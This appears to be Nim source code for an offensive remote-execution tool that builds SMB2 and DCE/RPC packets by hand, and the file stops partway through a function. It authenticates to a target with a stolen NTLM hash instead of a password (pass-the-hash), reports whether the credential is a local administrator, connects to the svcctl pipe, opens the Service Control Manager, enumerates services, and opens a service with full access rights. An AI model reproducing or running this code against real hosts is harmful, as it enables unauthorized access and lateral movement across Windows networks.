import net
import ptr_math
import hostname
import sequtils
import std/endians
import std/strutils
import std/sysrand
import std/os
import Structs
import AuxFunctions
import HeaderFillers



proc NegotiateSMB2*(socket: net.Socket,messageID:ptr uint64,treeID:ptr array[4,byte],sessionID:ptr array[8,byte]):bool=
    var smb2Header:SMB2Header = SMB2HeaderFiller(0,0,0,messageID[],treeID[],sessionID[])
    var smb2Negotiate:SMB2NegotiateRequest = SMB2NegotiateFiller()
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + sizeof(SMB2NegotiateRequest))
    var dataLength:int = sizeof(SMB2Header)+sizeof(SMB2NegotiateRequest)+sizeof(NetBiosHeader)
    var sendData:seq[byte]=newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2Negotiate, sizeof(SMB2NegotiateRequest))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    # Check NT Status value - Success
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false


proc NTLMSSPAuth*(socket: net.Socket,options:ptr OPTIONS,smbNegotiateFlags:seq[byte],smbSessionKeyLengthBytes:seq[byte], messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte],returnValue:var array[5096,byte], returnSize:var uint32):bool =
    var patternBytes:array[8,byte] = [byte 0x4E,0x54,0x4C,0x4D,0x53,0x53,0x50,0x00]
    messageID[] = messageID[]+1
    var seperatorIndex:int = FindIndex(addr returnValue[0],cast[int](returnSize),addr patternBytes[0],8)
    var smbDomainLength:int = cast[int]((returnValue[seperatorIndex+12] shl 0) or (returnValue[seperatorIndex+12+1] shl 8))
    var smbTargetLength:int = cast[int]((returnValue[seperatorIndex+40] shl 0) or (returnValue[seperatorIndex+40+1] shl 8))
    copyMem(addr (sessionID[])[0],addr returnValue[44],8)

    var smbNTLMChallenge:seq[byte] = GetByteRange(addr returnValue[0],seperatorIndex+24,seperatorIndex+31)
    var smbTargetDetails:seq[byte] = GetByteRange(addr returnValue[0],seperatorIndex+56+smbDomainLength,seperatorIndex+55+smbDomainLength+smbTargetLength) # Checked
    var smbTargetTimeBytes:seq[byte] = GetByteRange(addr smbTargetDetails[0],smbTargetDetails.len-12,smbTargetDetails.len-5)
    var hashBytes:seq[byte] = HexStringToByteArray(options.Hash,options.Hash.len)
    var authHostnameInWchars:WideCStringObj = newWideCString(getHostname())
    var authHostnameInWCharsBytes:seq[byte] = newSeq[byte](authHostnameInWchars.len*2)
    copyMem(addr authHostnameInWCharsBytes[0],addr authHostnameInWchars[0],authHostnameInWchars.len*2)

    var authDomainInWChars:WideCStringObj = newWideCString(options.Domain)
    var authDomainInWCharsBytes:seq[byte] = newSeq[byte](authDomainInWChars.len*2)
    copyMem(addr authDomainInWCharsBytes[0],addr authDomainInWChars[0],authDomainInWChars.len*2)

    var authUsernameInWChars:WideCStringObj = newWideCString(options.Username)
    var authUsernameInWCharsBytes:seq[byte] = newSeq[byte](authUsernameInWChars.len*2)
    copyMem(addr authUsernameInWCharsBytes[0],addr authUsernameInWChars[0],authUsernameInWChars.len*2)
    # Checked until here
    var authHostnameLength:uint32 = cast[uint32](authHostnameInWCharsBytes.len) 
    var authHostnameLengthBytes:seq[byte] = @[(cast[ptr byte](unsafeaddr authHostnameLength))[],(cast[ptr byte](unsafeaddr(authHostnameLength)) + 1)[] ] 
    var authDomainLength:uint32 = cast[uint32](authDomainInWCharsBytes.len)
    var authDomainLengthBytes:seq[byte] = @[(cast[ptr byte](unsafeaddr authDomainLength))[],(cast[ptr byte](unsafeaddr(authDomainLength)) + 1)[] ] 
    var authUsernameLength:uint32 = cast[uint32](authUsernameInWCharsBytes.len)
    var authUsernameLengthBytes:seq[byte] = @[(cast[ptr byte](unsafeaddr authUsernameLength))[],(cast[ptr byte](unsafeaddr(authUsernameLength)) + 1)[] ] 
    var authDomainOffset:seq[byte] = @[byte 0x40, 0x00, 0x00, 0x00]
    # Just to use bigEndian if you have such cpu - buraya kadar geldik
    var authUsernameOffset:seq[byte] = newSeq[byte](4)
    var authUsernameOffsetValue:uint32 = authDomainLength + 64
    var authHostnameOffset:seq[byte] = newSeq[byte](4)
    var authHostnameOffsetValue:uint32 = authDomainLength + authUsernameLength + 64
    var authLMOffset:seq[byte] = newSeq[byte](4)
    var authLMOffsetValue:uint32 = authDomainLength + authUsernameLength + authHostnameLength + 64
    var authNTLMOffset:seq[byte] = newSeq[byte](4)
    var authNTLMOffsetValue:uint32 = authDomainLength + authUsernameLength + authHostnameLength + 88

    littleEndian16(addr authUsernameOffset[0],unsafeAddr (authUsernameOffsetValue))
    littleEndian16(addr authHostnameOffset[0],unsafeAddr (authHostnameOffsetValue))
    littleEndian16(addr authLMOffset[0],unsafeAddr (authLMOffsetValue))
    littleEndian16(addr authNTLMOffset[0],unsafeAddr (authNTLMOffsetValue))
    var usernameAndTarget:string = options.Username.toUpperAscii()
    var usernameAndTargetInWchars:WideCStringObj = newWideCString(usernameAndTarget & options.Domain)
    var ntlmv2Hash:array[0..15, uint8]= hmac_md5(addr hashBytes[0],(hashBytes.len),cast[ptr byte](addr usernameAndTargetInWchars[0]),(usernameAndTargetInWchars.len*2))
    # Checked
    var clientChallengeBytes:seq[byte] = urandom(8)
    var securityBlobBytes:seq[byte] = @[byte 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    securityBlobBytes = concat(securityBlobBytes, smbTargetTimeBytes,clientChallengeBytes,@[byte 0x00, 0x00, 0x00, 0x00],smbTargetDetails,@[byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
    var serverChallengeAndSecurityBlobBytes = concat(smbNTLMChallenge,securityBlobBytes)                   
    var ntlmv2ResponseArray:array[0..15, uint8] = hmac_md5(addr ntlmv2Hash[0],(ntlmv2Hash.len),addr serverChallengeAndSecurityBlobBytes[0],(serverChallengeAndSecurityBlobBytes.len))
    var ntlmv2Response:seq[byte] = newSeq[byte](16)
    for i in countup(0,15):
        ntlmv2Response[i] = ntlmv2ResponseArray[i]
    ntlmv2Response = concat(ntlmv2Response,securityBlobBytes)
    var ntlmv2ResponseLength:uint32 = cast[uint32](ntlmv2Response.len) 
    var ntlmv2ResponseLengthBytes:seq[byte] = @[(cast[ptr byte](unsafeaddr ntlmv2ResponseLength))[],(cast[ptr byte](unsafeaddr(ntlmv2ResponseLength)) + 1)[] ] 
    var smbSessionKeyOffsetValue:uint32 = cast[uint32](authDomainInWChars.len*2 + authUsernameInWChars.len*2 + authHostnameInWchars.len*2 + ntlmv2Response.len + 88);
    var smbSessionKeyOffset:seq[byte] = newSeq[byte](4)
    littleEndian16(addr smbSessionKeyOffset[0],unsafeAddr (smbSessionKeyOffsetValue))
    var ntlmSSPResponse:seq[byte] = concat(@[byte 0x4e, 0x54, 0x4c, 0x4d, 0x53, 0x53, 0x50, 0x00, 0x03, 0x00, 0x00, 0x00, 0x18, 0x00, 0x18, 0x00],
                                            authLMOffset,
                                            ntlmv2ResponseLengthBytes,
                                            ntlmv2ResponseLengthBytes,
                                            authNTLMOffset,
                                            authDomainLengthBytes,
                                            authDomainLengthBytes,
                                            authDomainOffset,
                                            authUsernameLengthBytes,
                                            authUsernameLengthBytes,
                                            authUsernameOffset,
                                            authHostnameLengthBytes,
                                            authHostnameLengthBytes,
                                            authHostnameOffset,
                                            smbSessionKeyLengthBytes,
                                            smbSessionKeyLengthBytes,
                                            smbSessionKeyOffset,
                                            smbNegotiateFlags,
                                            authDomainInWCharsBytes,
                                            authUsernameInWCharsBytes,
                                            authHostnameInWcharsBytes,
                                            @[byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00],
                                            ntlmv2Response
                                            )
    
    var smb2Header:SMB2Header = SMB2HeaderFiller(1,1,64,messageID[],treeID[],sessionID[])
    var ntlmSSPAuthHeader:NTLMSSPAuth = NTLMSSPAuthFiller(ntlmSSPResponse.len)
    var ntlmSSPAuthHeaderBytes:seq[byte] = newSeq[byte](16)
    copyMem(addr ntlmSSPAuthHeaderBytes[0],addr ntlmSSPAuthHeader,16)
    var ntlmSSPAuth:seq[byte] = concat(ntlmSSPAuthHeaderBytes,ntlmSSPResponse)
    var smb2SessionSetupHeader:SessionSetupHeader = SessionSetupHeaderFiller(cast[uint16](ntlmSSPAuth.len))
    var sizeOfSessionSetupHeader:int = sizeof(SessionSetupHeader)
    var smb2SessionSetupBytes:seq[byte] = newSeq[byte](sizeOfSessionSetupHeader)
    copyMem(addr smb2SessionSetupBytes[0],addr smb2SessionSetupHeader,sizeOfSessionSetupHeader)
    var smb2SessionSetup:seq[byte] = concat(smb2SessionSetupBytes,ntlmSSPAuth)
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + smb2SessionSetup.len)
    var dataLength:int = sizeof(SMB2Header) + smb2SessionSetup.len + sizeof(NetBiosHeader)
    var sendData:seq[byte]= newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2SessionSetup[0], smb2SessionSetup.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    # Check NT Status value - Success
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false


proc NTLMAuthentication*(socket: net.Socket,options:ptr OPTIONS,smbNegotiateFlags:seq[byte],smbSessionKeyLengthBytes:seq[byte], messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(1,1,64,messageID[],treeID[],sessionID[])
    var ntlmSSPNegotiate:NTLMSSPNegotiate = NTLMSSPNegotiateFiller(smbNegotiateFlags)
    var smb2SessionSetup:SessionSetupHeader = SessionSetupHeaderFiller(cast[uint16](sizeof(NTLMSSPNegotiate)))
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + sizeof(NTLMSSPNegotiate) + sizeof(SessionSetupHeader))
    var dataLength:int = sizeof(SMB2Header) + sizeof(NTLMSSPNegotiate) + sizeof(SessionSetupHeader)+sizeof(NetBiosHeader)
    var sendData:seq[byte]= newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2SessionSetup, sizeof(SessionSetupHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SessionSetupHeader)],addr ntlmSSPNegotiate, sizeof(NTLMSSPNegotiate))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    # Check NT Status value - STATUS_MORE_PROCESSING_REQUIRED
    if(returnValue[12] == 0x16 and returnValue[13] == 0x00 and returnValue[14] == 0x00 and returnValue[15] == 0xc0):
        var returnFlag:bool = NTLMSSPAuth(socket,options,smbNegotiateFlags,smbSessionKeyLengthBytes,messageID,treeID,sessionID,returnValue,returnSize)
        return returnFlag
    else:
        return false


proc TreeConnectRequest*(socket: net.Socket,options:ptr OPTIONS, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte]):bool =
    var smbPathString:string = "\\\\" & options.Target & "\\IPC$"
    var smbPathInWchars:WideCStringObj = newWideCString(smbPathString)
    var smbPathInBytes:seq[byte] = newSeq[byte](smbPathInWchars.len*2)
    copyMem(addr smbPathInBytes[0],addr smbPathInWchars[0],smbPathInWchars.len*2)
    var smb2Header:SMB2Header = SMB2HeaderFiller(3,1,1,messageID[],treeID[],sessionID[])
    var smb2TreeConnectRequestHeader:TreeConnectRequest = TreeConnectRequestFiller(smbPathInBytes.len)
    var smb2DataLength:int = 8+smbPathInBytes.len
    var smb2Data:seq[byte] = newSeq[byte](smb2DataLength)
    copyMem(addr smb2Data[0],addr smb2TreeConnectRequestHeader, 8)
    copyMem(addr smb2Data[8],addr smbPathInBytes[0],smbPathInBytes.len)
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + smb2Data.len)
    var dataLength:int = sizeof(SMB2Header) + smb2Data.len + sizeof(NetBiosHeader)
    var sendData:seq[byte]= newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2Data[0], smb2Data.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false


proc CreateRequest*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte]):bool =
    treeID[] = [byte 0x01, 0x00, 0x00 , 0x00]
    var smb2NamedPipeBytes:seq[byte] = @[byte 0x73, 0x00, 0x76, 0x00, 0x63, 0x00, 0x63, 0x00, 0x74, 0x00, 0x6c, 0x00]
    var smb2Header:SMB2Header = SMB2HeaderFiller(5,1,1,messageID[],treeID[],sessionID[])
    var smb2CreateRequestFileHeader:CreateRequestFile = CreateRequestFileFiller(smb2NamedPipeBytes.len)
    var smb2DataLength:int = sizeof(CreateRequestFile)+smb2NamedPipeBytes.len
    var smb2Data:seq[byte] = newSeq[byte](smb2DataLength)
    copyMem(addr smb2Data[0],addr smb2CreateRequestFileHeader,sizeof(CreateRequestFile))
    copyMem(addr smb2Data[sizeof(CreateRequestFile)],addr smb2NamedPipeBytes[0],smb2NamedPipeBytes.len )
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + smb2Data.len)
    var dataLength:int = sizeof(SMB2Header) + smb2Data.len + sizeof(NetBiosHeader)
    var sendData:seq[byte]= newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2Data[0], smb2Data.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        var tempArray:seq[byte] = GetByteRange(addr returnValue[0],132,147)
        for i in countup(0,15):
            (fileID[])[i] = tempArray[i]
        return true
    else:
        return false

proc RPCBindRequest*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(9,1,1,messageID[],treeID[],sessionID[])
    var smbNamedPipeUUID:array[16,byte] = [byte 0x81, 0xbb, 0x7a, 0x36, 0x44, 0x98, 0xf1, 0x35, 0xad, 0x32, 0x98, 0xf0, 0x38, 0x00, 0x10, 0x03]
    var smbNamedPipeUUIDVersion:array[2,byte] = [byte 0x02, 0x00]
    var contextID:array[2,byte] = [byte 0x00, 0x00]
    var rpcBindHeader:RPCBind = RPCBindFiller(callID[],contextID,smbNamedPipeUUID,smbNamedPipeUUIDVersion)
    var smb2WriteHeader:SMB2WriteHeader = SMB2WriteRequest(sizeof(RPCBind), fileID)
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + sizeof(RPCBind) + sizeof(SMB2WriteHeader))
    var dataLength:int = sizeof(SMB2Header) +  sizeof(RPCBind) + sizeof(SMB2WriteHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte]= newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2WriteHeader, sizeof(SMB2WriteHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader) + sizeof(SMB2WriteHeader)],addr rpcBindHeader, sizeof(RPCBind))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        return true
    else:
        return false



proc ReadRequest*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte]):bool =
    sleep(2000);
    var smb2Header:SMB2Header = SMB2HeaderFiller(8,1,1,messageID[],treeID[],sessionID[])
    var smb2ReadHeader:SMB2ReadHeader = SMB2ReadRequest(fileID[])
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + sizeof(SMB2ReadHeader))
    var dataLength:int = sizeof(SMB2Header) +  sizeof(SMB2ReadHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2ReadHeader, sizeof(SMB2ReadHeader))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    
    while((returnValue[12] == 0x03) and (returnValue[13] == 0x01) and (returnValue[14] == 0x00) and (returnValue[15] == 0x00)):
        (returnValue,returnSize) = SendAndReceiveFromSocket(socket,nil,false)
    if((cast[ptr uint32](addr returnValue[12]))[] == 0):
        messageID[] = messageID[]+1
        return true
    else:
        return false

proc OpenSCManagerWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], targetBytesInWCharForm: WideCStringObj):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var openSCManagerWData:seq[byte] = OpenSCManagerWFiller(targetBytesInWCharForm)
    var rpcHeader:RPCHeader = RPCHeaderFiller(openSCManagerWData.len,callID,[byte 0x0f, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,openSCManagerWData.len+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + openSCManagerWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + openSCManagerWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr openSCManagerWData[0], openSCManagerWData.len)
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[returnSize-4]))[] == 0):
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        var isZero:bool = true
        var tempArr:seq[byte] = GetByteRange(addr returnValue[0],140,159)
        # Check all zero
        for i in countup(0,19):
            if(tempArr[i] != 0x00):
                isZero = false
                break
        if(isZero):
            return false
        copyMem(scManagerHandle,addr tempArr[0],20)
        return true
    elif(returnValue[128] == 0x05 and returnValue[129] == 0x00 and returnValue[130] == 0x00 and returnValue[131] == 0x00):
        echo "[!] Given credential is not a local administrator on target!"
        return false
    else:
        return false
    return true

proc ReadFragment(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], length: array[4,byte]):(array[5096,byte],uint32) =
    sleep(2000);
    var smb2Header:SMB2Header = SMB2HeaderFiller(8,1,1,messageID[],treeID[],sessionID[])
    var smb2ReadHeader:SMB2ReadHeader = SMB2ReadRequest(fileID[],length)
    var netbiosHeader:NetBiosHeader = NetBiosFiller(sizeof(SMB2Header) + sizeof(SMB2ReadHeader))
    var dataLength:int = sizeof(SMB2Header) +  sizeof(SMB2ReadHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2ReadHeader, sizeof(SMB2ReadHeader))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    messageID[] = messageID[]+1
    return (returnValue,returnSize)
   
proc EnumServicesStatusWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceList: ptr seq[ServiceInfo]):bool =
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var enumServicesStatusWData:EnumServicesStatusWData = EnumServicesStatusWFiller(scManagerHandle,0)
    var rpcHeader:RPCHeader = RPCHeaderFiller(sizeof(EnumServicesStatusWData),callID,[byte 0x0e, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(EnumServicesStatusWData)+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(EnumServicesStatusWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + sizeof(EnumServicesStatusWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr enumServicesStatusWData, sizeof(EnumServicesStatusWData))
    (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
    if((cast[ptr uint32](addr returnValue[144]))[] != 0):
        var servicesBufferSize:uint32 = (cast[ptr uint32](addr returnValue[144]))[]
        messageID[] = messageID[]+1
        callID[] = callID[]+1
        smb2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
        enumServicesStatusWData = EnumServicesStatusWFiller(scManagerHandle,servicesBufferSize)
        rpcHeader = RPCHeaderFiller(sizeof(EnumServicesStatusWData),callID,[byte 0x0e, 0x00])
        smb2IoctlHeader = SMB2IoctlRequest(fileID,sizeof(EnumServicesStatusWData)+sizeof(RPCHeader))
        netbiosHeader = NetBiosFiller( sizeof(SMB2Header) + sizeof(EnumServicesStatusWData) + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
        zeroMem(addr sendData[0],dataLength)
        zeroMem(addr returnValue[0], 5096)
        returnSize = 0
        copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
        copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)],addr rpcHeader, sizeof(RPCHeader))
        copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)+sizeof(SMB2IoctlHeader)+sizeof(RPCHeader)],addr enumServicesStatusWData, sizeof(EnumServicesStatusWData))
        (returnValue,returnSize) = SendAndReceiveFromSocket(socket,addr sendData)
        if (returnValue[12] == 0x05 and returnValue[13] == 0x00 and returnValue[14] == 0x00 and returnValue[15] == 0x80): # STATUS_BUFFER_OVERFLOW
            # Our buffer
            messageID[] = messageID[]+1
            var fragmentedEnumList: seq[byte]
            var firstTime:bool = true
            var length:array[4,byte] = [byte 0xb8, 0x0c, 0x00, 0x00 ]
            var tempRPCData:seq[byte] = GetByteRange(addr returnValue[0],116,cast[int](returnSize-1))
            if(tempRPCData[2] == 0x02):
                fragmentedEnumList = GetByteRange(addr tempRPCData[0],24,tempRPCData.len-1)
            else:
                return false
            while(servicesBufferSize > cast[uint32](fragmentedEnumList.len)):
                (returnValue, returnSize) = ReadFragment(socket,messageID,treeID,sessionID,fileID,length)
                if(firstTime):
                    tempRPCData = GetByteRange(addr returnValue[0],84,cast[int](returnSize-1))
                else:
                    tempRPCData = GetByteRange(addr returnValue[0],108,cast[int](returnSize-1))
                firstTime = false
                length = [byte 0xb8, 0x10, 0x00, 0x00]
                fragmentedEnumList.add(tempRPCData)
            var returnedServiceNum:uint32 = (cast[ptr uint32](addr fragmentedEnumList[fragmentedEnumList.len-12]))[]            

            var tempIndex:uint32 = 0
            var offset:int = 4
            var nameOffset:uint32 = 0
            var dispOffset:uint32 = 0
            var serviceNamePtr:ptr byte 
            var displayNamePtr:ptr byte
            var serviceInfoStruct:ServiceInfo
            echo "[+] Number of obtained services: ", returnedServiceNum
            while(tempIndex<returnedServiceNum):
                nameOffset = (cast[ptr uint32](addr fragmentedEnumList[offset]))[]
                dispOffset = (cast[ptr uint32](addr fragmentedEnumList[offset+4]))[]
                serviceInfoStruct.ServiceType = (cast[ptr uint32](addr fragmentedEnumList[offset+8]))[]
                serviceInfoStruct.ServiceState = (cast[ptr uint32](addr fragmentedEnumList[offset+12]))[]
                serviceNamePtr = addr(fragmentedEnumList[nameOffset+4])
                serviceInfoStruct.ServiceName = ExtractWchar(serviceNamePtr,fragmentedEnumList.len-cast[int](nameOffset))
                displayNamePtr = addr(fragmentedEnumList[dispOffset+4])
                serviceInfoStruct.DisplayName = ExtractWchar(displayNamePtr,fragmentedEnumList.len-cast[int](dispOffset))
                if(serviceInfoStruct.ServiceName == "" or serviceInfoStruct.DisplayName == ""):
                    return false
                serviceList[].add(serviceInfoStruct)
                offset+=36
                tempIndex+=1
            return true
        else:
            # If you encounter such a case, please send a wireshark capture.
            return false

    else:
        return false

proc OpenServiceWRPC*(socket: net.Socket, messageID:ptr uint64, treeID: ptr array[4,byte], sessionID: ptr array[8,byte], fileID: ptr array[16,byte], callID:ptr int, scManagerHandle: ptr array[20,byte], serviceName: string, scServiceHandle: ptr array[20,byte]):bool =
    var accessMask:int = 0xF01FF
    var smb2Header:SMB2Header = SMB2HeaderFiller(0x0b,1,1,messageID[],treeID[],sessionID[])
    var openServiceWData:seq[byte] = OpenServiceWFiller(scManagerHandle,serviceName,accessMask)
    var rpcHeader:RPCHeader = RPCHeaderFiller(openServiceWData.len,callID,[byte 0x10, 0x00])
    var smb2IoctlHeader:SMB2IoctlHeader = SMB2IoctlRequest(fileID,openServiceWData.len+sizeof(RPCHeader))
    var netbiosHeader:NetBiosHeader = NetBiosFiller( sizeof(SMB2Header) + openServiceWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader))
    var dataLength:int = sizeof(SMB2Header) + openServiceWData.len + sizeof(SMB2IoctlHeader) + sizeof(RPCHeader) + sizeof(NetBiosHeader)
    var sendData:seq[byte] = newSeq[byte](dataLength)
    var returnValue:array[5096,byte]
    var returnSize:uint32
    copyMem(addr sendData[0],addr netbiosHeader, sizeof(NetBiosHeader))
    copyMem(addr sendData[sizeof(NetBiosHeader)],addr smb2Header, sizeof(SMB2Header))
    copyMem(addr sendData[sizeof(SMB2Header)+sizeof(NetBiosHeader)],addr smb2IoctlHeader, sizeof(SMB2IoctlHeader))
